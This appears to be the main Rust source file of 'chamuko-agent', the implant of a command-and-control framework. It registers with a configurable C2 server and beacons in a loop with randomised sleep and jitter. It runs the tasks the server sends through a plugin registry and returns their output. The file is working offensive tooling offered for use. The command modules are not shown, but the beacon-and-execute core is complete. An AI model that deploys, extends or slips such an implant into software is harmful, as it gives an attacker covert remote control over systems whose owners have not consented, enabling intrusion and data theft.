use std::env;
use std::process::ExitCode;
use std::time::Duration;

use chamuko_core::PluginRegistry;
use chamuko_plugin_api::LifecycleEvent;
use chamuko_protocol::{AgentInfo, Task, TaskResult};

mod client;
mod commands;

use client::{C2Client, C2Error};
use commands::CoreCommands;

struct Config {
    c2_url: String,
    sleep: u64,
    jitter: u64,
    name: String,
    token: Option<String>,
    once: bool,
}

const FALLBACK_C2_URL: &str = "http://127.0.0.1:8080";
const FALLBACK_SLEEP: u64 = 10;
const FALLBACK_JITTER: u64 = 3;

fn default_c2_url() -> String {
    option_env!("CHAMUKO_C2_URL")
        .unwrap_or(FALLBACK_C2_URL)
        .to_string()
}

fn default_sleep() -> u64 {
    option_env!("CHAMUKO_SLEEP")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_SLEEP)
}

fn default_jitter() -> u64 {
    option_env!("CHAMUKO_JITTER")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_JITTER)
}

fn default_name() -> String {
    option_env!("CHAMUKO_NAME").unwrap_or("").to_string()
}

fn default_token() -> Option<String> {
    option_env!("CHAMUKO_TOKEN")
        .filter(|t| !t.is_empty())
        .map(str::to_string)
}

fn parse_u64(s: &str, fallback: u64) -> u64 {
    s.parse().unwrap_or(fallback)
}

const HELP: &str = "chamuko-agent\n\
                    --url <url>     C2 server URL\n\
                    --sleep <s>     base beacon sleep seconds\n\
                    --jitter <s>    max random jitter seconds\n\
                    --name <name>   agent label\n\
                    --token <tok>   C2 auth token\n\
                    --once          run a single beacon then exit\n\
                    --help          show this help";

impl Config {
    fn from_args() -> Self {
        let mut config = Self {
            c2_url: default_c2_url(),
            sleep: default_sleep(),
            jitter: default_jitter(),
            name: default_name(),
            token: default_token(),
            once: false,
        };

        let args: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < args.len() {
            let next = args.get(i + 1).cloned();
            let mut consumed = true;
            match args[i].as_str() {
                "--url" | "-u" => match next {
                    Some(v) => config.c2_url = v,
                    None => consumed = false,
                },
                "--sleep" | "-s" => match next {
                    Some(v) => config.sleep = parse_u64(&v, config.sleep),
                    None => consumed = false,
                },
                "--jitter" | "-j" => match next {
                    Some(v) => config.jitter = parse_u64(&v, config.jitter),
                    None => consumed = false,
                },
                "--name" | "-n" => match next {
                    Some(v) => config.name = v,
                    None => consumed = false,
                },
                "--token" | "-t" => match next {
                    Some(v) => config.token = Some(v).filter(|t: &String| !t.is_empty()),
                    None => consumed = false,
                },
                "--once" => {
                    config.once = true;
                    consumed = false;
                }
                "--help" | "-h" => {
                    println!("{HELP}");
                    std::process::exit(0);
                }
                other => {
                    eprintln!("unknown argument: {other}");
                    consumed = false;
                }
            }
            i += if consumed { 2 } else { 1 };
        }

        config
    }
}

fn jitter_sleep(base: u64, jitter: u64) {
    let extra = if jitter > 0 {
        rand::random::<u64>() % jitter
    } else {
        0
    };
    std::thread::sleep(Duration::from_secs(base + extra));
}

fn execute_task(registry: &mut PluginRegistry, task: &Task) -> TaskResult {
    match registry.execute(&task.command, &task.args) {
        Some(Ok(out)) => TaskResult {
            task_id: task.id.clone(),
            output: out.stdout,
            error: None,
            exit_code: Some(out.exit_code),
        },
        Some(Err(e)) => TaskResult {
            task_id: task.id.clone(),
            output: String::new(),
            error: Some(e.to_string()),
            exit_code: None,
        },
        None => TaskResult {
            task_id: task.id.clone(),
            output: String::new(),
            error: Some(format!("no plugin handles command '{}'", task.command)),
            exit_code: None,
        },
    }
}

/// Registers with the C2 and adopts the sleep/jitter it hands back.
fn register(
    client: &C2Client,
    info: &AgentInfo,
    sleep: &mut u64,
    jitter: &mut u64,
) -> Result<String, C2Error> {
    let resp = client.register(info, *sleep, *jitter)?;
    *sleep = resp.sleep;
    *jitter = resp.jitter;
    eprintln!(
        "registered as agent {} (sleep={}s jitter={}s)",
        resp.id, resp.sleep, resp.jitter
    );
    Ok(resp.id)
}

fn run(config: &Config, registry: &mut PluginRegistry) -> Result<(), C2Error> {
    let client = C2Client::new(config.c2_url.clone(), config.token.clone());
    let info = AgentInfo::local(config.name.clone());

    let mut sleep = config.sleep;
    let mut jitter = config.jitter;
    let mut id = register(&client, &info, &mut sleep, &mut jitter)?;

    loop {
        let beacon = match client.beacon(&id) {
            Ok(beacon) => beacon,
            Err(e) if e.is_unknown_agent() => {
                eprintln!("C2 no longer knows {id}; re-registering");
                id = register(&client, &info, &mut sleep, &mut jitter)?;
                continue;
            }
            Err(e) => {
                eprintln!("beacon error: {e}");
                if config.once {
                    return Ok(());
                }
                jitter_sleep(sleep, jitter);
                continue;
            }
        };

        if let Some(value) = beacon.sleep {
            sleep = value;
        }
        if let Some(value) = beacon.jitter {
            jitter = value;
        }

        let mut results = Vec::with_capacity(beacon.tasks.len());
        for task in &beacon.tasks {
            let result = execute_task(registry, task);
            if let Some(err) = &result.error {
                eprintln!("task {} error: {err}", task.id);
            }
            results.push(result);
        }

        if let Err(e) = client.post_results(&id, results) {
            eprintln!("failed to post results: {e}");
            if e.is_unknown_agent() {
                id = register(&client, &info, &mut sleep, &mut jitter)?;
                continue;
            }
        }

        if config.once {
            return Ok(());
        }
        jitter_sleep(sleep, jitter);
    }
}

fn main() -> ExitCode {
    let config = Config::from_args();

    let mut registry = PluginRegistry::new();
    if let Err(e) = registry.register(Box::new(CoreCommands::new())) {
        eprintln!("failed to register core plugin: {e}");
        return ExitCode::FAILURE;
    }

    let mut failures = registry.dispatch(LifecycleEvent::Startup);
    eprintln!(
        "chamuko-agent: {} plugin(s); C2={} sleep={}s jitter={}s name='{}' auth={}",
        registry.len(),
        config.c2_url,
        config.sleep,
        config.jitter,
        config.name,
        if config.token.is_some() { "token" } else { "none" }
    );

    if let Err(e) = run(&config, &mut registry) {
        eprintln!("agent error: {e}");
        failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
        for f in &failures {
            eprintln!("{f}");
        }
        return ExitCode::FAILURE;
    }

    failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
    for f in &failures {
        eprintln!("{f}");
    }

    if failures.is_empty() {
        ExitCode::SUCCESS
    } else {
        ExitCode::FAILURE
    }
}
